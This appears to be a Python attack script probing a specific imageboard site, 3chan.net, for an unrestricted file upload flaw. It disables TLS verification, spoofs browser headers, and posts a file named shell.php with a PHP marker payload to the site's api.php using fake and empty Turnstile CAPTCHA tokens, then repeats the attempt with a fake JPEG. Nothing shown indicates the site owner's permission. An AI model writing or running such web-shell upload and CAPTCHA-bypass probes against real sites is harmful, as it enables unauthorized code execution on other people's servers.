#!/usr/bin/env python3
"""3chan api.php via HTTPS - upload shell test"""
import urllib.request, uuid, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Origin": "https://3chan.net",
      "Referer": "https://3chan.net/"}

def upload(filename, token, content, ctype="image/jpeg"):
    boundary = uuid.uuid4().hex
    body = b""
    fields = [("action", "post_thread"), ("board", "b"), ("turnstile_token", token),
              ("name", "t"), ("subject", ""), ("email", ""), ("comment", "test"),
              ("spoiler", "0")]
    for k, v in fields:
        body += b"--" + boundary.encode() + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += v.encode() + b"\r\n"
    body += b"--" + boundary.encode() + b"\r\n"
    body += ('Content-Disposition: form-data; name="image"; filename="%s"\r\n' % filename).encode()
    body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
    body += content + b"\r\n"
    body += b"--" + boundary.encode() + b"--\r\n"
    h = {**UA, "Content-Type": "multipart/form-data; boundary=" + boundary}
    req = urllib.request.Request("https://3chan.net/api.php", data=body, headers=h, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=15, context=ctx)
        return r.status, r.read(8000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:120]

def get(url):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=15, context=ctx)
        return r.status, r.read(8000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(3000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:100]

print("GET threads:", get("https://3chan.net/api.php?action=threads&board=b&page=0"), flush=True)
print("POST fake token shell.php:", upload("shell.php", "0x4AAAAAAC-fake123", b'<?php echo "SHELL_3CHAN_271828"; ?>', "application/x-php"), flush=True)
print("POST empty token shell.php:", upload("shell.php", "", b'<?php echo "SHELL_3CHAN_271828"; ?>'), flush=True)
print("POST fake token jpg:", upload("test.jpg", "0x4AAAAAAC-fake123", b'\xff\xd8\xff\xe0fakejpeg'), flush=True)
